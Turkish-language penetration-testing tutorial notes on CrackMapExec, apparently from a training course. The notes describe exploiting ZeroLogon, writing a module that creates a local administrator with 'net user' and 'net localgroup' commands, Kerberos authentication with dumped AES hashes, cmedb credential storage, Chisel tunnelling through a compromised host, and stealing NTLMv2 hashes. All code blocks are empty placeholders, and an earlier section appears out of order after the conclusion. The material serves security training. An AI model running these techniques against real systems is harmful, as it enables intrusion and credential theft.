CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( `logging.debug` ) ile bazı debug log'ları eklediğini göreceğiz. CrackMapExec'i hata debug modunda çalıştırırsak, bu logları yazdıracaktır.

CrackMapExec'i debug modunda çalıştırmak için protokolden önce `--verbose` seçeneğini kullanabiliriz


### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma

{{CODE_BLOCK_225}}


`DEBUG` ile başlayan satırlar `logging.debug`'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB servisindeki kritik bir kimliği doğrulanmamış remote kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### Güvenlik Açığından Yararlanma

Birçok güvenlik açığı gördük. Onlardan birini exploit etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.

---

### Kendi CME Modülümüzü Oluşturmak

Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.


### CrackMapExec'i Poetry ile derleyin

Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın

Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un Kurulması ve Çalıştırılması

{{CODE_BLOCK_229}}

Daha sonra açmak için `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni Modülümüzü Oluşturun

Modülümüzü oluşturalım. Yeni bir administrator hesabı oluşturacak basit bir script oluşturacağız.

* ./CrackMapExec/cme/modules klasörü altında `createadmin.py` adında bir dosya oluşturun.
* Aşağıdaki kod örneğini dosyaya kopyalayın:

{{CODE_BLOCK_231}}



* Şimdi modülümüzü özelleştirelim.

Bazı değişkenleri tanımlamamız gerekiyor:

* `name`, modül adını nasıl çağıracağımızı belirtir. Bu durumda, `createadmin` dosya adını kullanacağız.
* `description` modülün amacı için kısa bir açıklamadır. Biz bunu `Create a new administrator account` ayarlayacağız.
* `supported_protocols`, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece `SMB` kullanacağız.
* `opsec_safe`, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir `True` veya `False` değeridir.
* `multiple_hosts`, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.

Ayrıca, modül için değişkenleri tanımlamak için kullanılan `options()` methoduna da sahip olacağız. Bu durumda, `USER` ve `PASS` olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri `asdasd123` . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak `context.log.info` ve `context.log.highlight` metotlarını kullanacağız (farklı renklere sahipler).

Bu execute için, yöntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için `net user username password /add /Y` değeriyle ve kullanıcıyı administrators grubuna eklemek için `net localgroup administrators username /add` değeriyle command değişkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modülümüz şu şekilde görünmelidir:

{{CODE_BLOCK_234}}


### Modülümüzü Çalıştırma

Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.


### CME Modülümüzün Çalıştırılması createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.

{{CODE_BLOCK_236}}


İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.

Ayrıca `context.log.highlight(p)`'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?

### Diğer Yazarlardan Öğrenmek

Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.

Örneğin, `procdump.py` modülü `procdump.exe` çalıştırılabilir dosyasını bir `Base64` string olarak kaydeder, ardından Base64 stringini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için `tasklist` komutunu çalıştırır, bunu bir değişkene kaydeder ve process kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.

Başka bir örnek `get_description.py` . Bu modülü `groupmembership` modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve `memberOf` attribute'unu almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir pull request gönderdik. Pull request kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.

Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.


### Pull Request Oluşturma

CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir pull request'i ekleyerek projeye katkıda bulunabiliriz.

Bir pull request'i yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.

İlerleyen bölümlerde, CrackMapExec kullanımı için `IPv6`, `Kerberos Kimlik Doğrulama` ve `CrackMapExec` veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.


### Ek CME İşlevselliği

CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:

* Audit mode
* IPv6 desteği
* Birden fazla cihaza saldırırken tamamlanma yüzdesi

### Audit Mode

5.3.0 sürümünde yeni bir mod eklendi: `audit modu`. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz `emoji` ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.

Audit modunu yapılandırmak için, varsayılan olarak `~/.cme/cme.conf` adresinde bulunan yapılandırma dosyasını düzenlememiz ve `audit_mode` parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için `#` karakterini kullanacağız


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Şimdi çalıştırabilir ve parolanın çıktıda `########` ile değiştirildiğini görebiliriz.

{{CODE_BLOCK_238}}

Gördüğümüz gibi, çalıştırma sonucundaki password `#` karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile Etkinleştirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diğer yeteneği, IPv6 üzerinden iletişimi desteklemesidir. Çoğu organizasyon, IPv6'yı varsayılan olarak etkinleştirmiştir, hatta bunu kullanmasalar bile, IPv6'nın log seviyesinde IPv4 kadar izlenmediği veya anlaşılmadığı durumlar da olabilir. Bu durum, ağ saldırılarının gerçekleştirilmesi ve tespit edilmeden geçmesi için bir fırsat yaratır.

Popüler modüller bölümünde gördüğümüz gibi, CrackMapExec, `get_netconnections` modülüyle bilgisayarların IPv6 adreslerini belirlememize olanak tanır. Bu modülü kullanarak IPv6 üzerinden komutu çalıştırmayı deneyelim.

### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Şimdi IPv6 üzerinden hedefe erişelim.

{{CODE_BLOCK_241}}



### Tamamlanma Yüzdesi

Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik `--shares` seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.


### Tamamlanma Yüzdesi

{{CODE_BLOCK_242}}

Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.

---


### Kerberos Authentication

Yazma sırasında CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:

* `ccache` dosyasını belirtmek için `KRB5CCNAME` env adını kullanma. 
* CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir Ticketla `KRB5CCNAME` environment variable'ını kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin `FQDN`'sini çözümlemesi gerektiğidir. İnternal bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve `/etc/hosts` dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi `Kerbrute`'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

{{CODE_BLOCK_246}}

Gördüğümüz gibi, `Kerbrute` CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, `asreproast` saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce `AESREPRoast` Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.

Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos logu etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.


### AES-128 veya AES-256 kullanma

Ayrıca, Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araçlar, genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullandığımızda, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve bu da operasyonel bir avantaj (opsec) sağlayacaktır. Hadi Secretsdump'u kullanalım ve ardından AES256 ile kimlik doğrulaması yapalım.


### AES256 ile Kimlik Doğrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle servislere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.

Çoğu durumda, Linux makineleri Kerberos tickerları ccache dosyaları olarak depolar, sistemlerin ticketları kullanma şekli, `ccache` dosyasının yolunu gösteren `KRB5CCNAME` environment variable aracılığıyla olur. robert kullanıcısı için bir ticket (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım

Ticket'ı oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME environment variable'i getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doğrulama yöntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak için `--use-kcache` seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.


### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)

{{CODE_BLOCK_251}}


### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)

{{CODE_BLOCK_252}}

Kerberos Kimlik Doğrulamasını `MSSQL` protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.


### MSSQL Protokolü ile ccache Dosyasını Kullanma

{{CODE_BLOCK_253}}

Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz


### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı `cmedb` ile etkileşime gireceğiz

---


### CMEDB'de Uzmanlaşmak

CME otomatik olarak tüm kullanılan/dump edilen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan `SQLite` veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları `~/.cme/workspaces` içinde saklanır. Varsayılan veritabanları `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.


### Varsayılan Veritabanlarını Listeleme

{{CODE_BLOCK_255}}

### Veritabanı ile Etkileşim

CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i götürecektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

Varsayılan workspace adı `default` olarak adlandırılır (bilgi `prompt` gösterildiği gibi). Bir workspace seçildiğinde, CME'de yaptığımız her şey bu workspace'de saklanacaktır. Bir workspace oluşturmak için, `cmedb (default) >` komut promt root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek için `workspace list` , workspace'i değiştirmek için ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve Değiştirme

{{CODE_BLOCK_258}}


### Bir Protokolün Veritabanına Erişim

cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca `SMB` ve `MSSQL` yararlı seçeneklere sahiptir:

| Protokol | Seçenekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolün veritabanına erişmek için `proto` `<protocol>` komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için `help` seçeneğini kullanabiliriz:

### SMB Protokol Veritabanına Bağlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.

### Kimlik Bilgilerini Görüntüleme

CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, `düz metin` veya `hash` olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki `creds` seçeneğini kullanmamız gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


Gördüğünüz gibi, creds'ten sonra bir `kullanıcı adı` ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca `creds hash` seçeneği ile tüm hash'leri veya `creds plaintext` seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir


### MSSQL için Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_262}}

Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için `-id CredID` seçeneğini kullanmamız gerekir.

### CrackMapExec ile Etkileşim için CredID Kullanımı

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için `cmedb` içerisinde SMB protokolü içerisinde `shares` seçeneğini kullanmamız gerekiyor.

### Paylaşımları Geri Alma

{{CODE_BLOCK_265}}


### Kullanıcı Ekleme ve Kaldırma

CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve `creds add` veya `creds remove` kullanıyoruz.


### cmedb'ye Kullanıcı Ekleme

{{CODE_BLOCK_266}}

Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.

### Bir Kullanıcıyı cmedb'den Kaldırma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini İmport Etme

cmedb'nin sahip olduğu bir başka özellik de `Empire`'dan kimlik bilgilerini import etme yeteneğidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu özelliği kullanmak istiyorsanız `Empire`'ı yapılandırdığınızdan emin olun

### Export cmedb Data

CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyası olarak dışa aktarılır. `LibreOffice` veya `Excel` gibi araçları kullanarak açabiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, ağ güvenliği testlerinde ve sızma testlerinde kullanıcıların işini kolaylaştıran, etkili bir araçtır. Geniş protokol desteği, hızlı keşif, güvenlik açıkları tespiti ve yönetimsel haklar elde etme gibi çeşitli özellikleriyle güvenlik profesyonellerinin vazgeçilmez araçları arasında yer alır. Bu araç, ağ yapılarının daha güvenli hale getirilmesi için önemli bir rol oynar ve her güvenlik uzmanının repertuarında bulunması gereken bir araçtır.


, 'print

{{CODE_BLOCK_96}}

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---


### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

{{CODE_BLOCK_107}}

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

{{CODE_BLOCK_109}}

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_110}}

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

